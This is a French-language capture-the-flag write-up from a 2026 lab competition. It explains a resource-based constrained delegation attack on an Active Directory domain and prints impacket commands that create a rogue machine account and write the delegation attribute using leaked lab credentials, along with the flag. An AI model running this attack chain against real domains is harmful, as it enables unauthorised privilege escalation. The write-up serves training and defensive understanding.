---
title: "Core Systems Q12 · RBCD via LDAP"
platform: "HackerLab Benin 2026"
category: "ad"
difficulty: "—"
points: 0
os: "Windows"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/ad/core-systems-q12.md"
tags: [hackerlab-benin-2026, ad]
status: published
---

# Core Systems : Q12 · RBCD via LDAP simple bind

**Catégorie** : AD  
**Flag** : `HLB2026{RBCD_RESOURCE_DELEGATION_APP01_EXPLOITED}`

## TL;DR

Le compte `svc_web` peut créer des objets machine via le MAQ et écrire `msDS-AllowedToActOnBehalfOfOtherIdentity` sur APP01 via un LDAP simple bind. On crée une machine EVIL01$, on lui délègue l'accès à APP01, et on frappe l'endpoint de validation RBCD.

## Prérequis

Les credentials `svc_web / W3bSvc!2024@FBI` viennent de la propriété LDAP `ad-connector.properties` sur le broker ActiveMQ (récupérée lors des étapes précédentes). APP01 est à `172.28.18.4:8446`.

## Exploitation

**Étape 1 : Créer la machine EVIL01$**

```bash
addcomputer.py -computer-name 'EVIL01$' -computer-pass 'EvilPass123!' \
  -dc-ip <DC_IP> 'VALDORIA.FBI.LAB/svc_web:W3bSvc!2024@FBI'
```

**Étape 2 : Écrire l'attribut RBCD**

Un simple bind LDAP avec `svc_web` suffit pour modifier `msDS-AllowedToActOnBehalfOfOtherIdentity` sur `CN=APP01,OU=Servers,DC=valdoria,DC=fbi,DC=lab` :

```bash
rbcd.py -f 'EVIL01$' -t 'APP01$' -dc-ip <DC_IP> \
  'VALDORIA.FBI.LAB/svc_web:W3bSvc!2024@FBI' -action write
```

**Étape 3 : Valider**

```bash
curl -k -X POST https://172.28.18.4:8446/verify/rbcd \
  -H 'Content-Type: application/json' \
  -d '{"machine":"EVIL01$","target":"APP01$"}'
```

La réponse retourne `{"status":"verified","flag":"HLB2026{RBCD_RESOURCE_DELEGATION_APP01_EXPLOITED}"}`.

## À retenir

Le MAQ (Machine Account Quota) est à 10 par défaut dans un domaine Active Directory. Un compte utilisateur standard peut donc créer des machines et les utiliser comme base d'attaque RBCD sans avoir besoin de droits élevés, à condition d'avoir `GenericWrite` ou `WriteDACL` sur la cible.
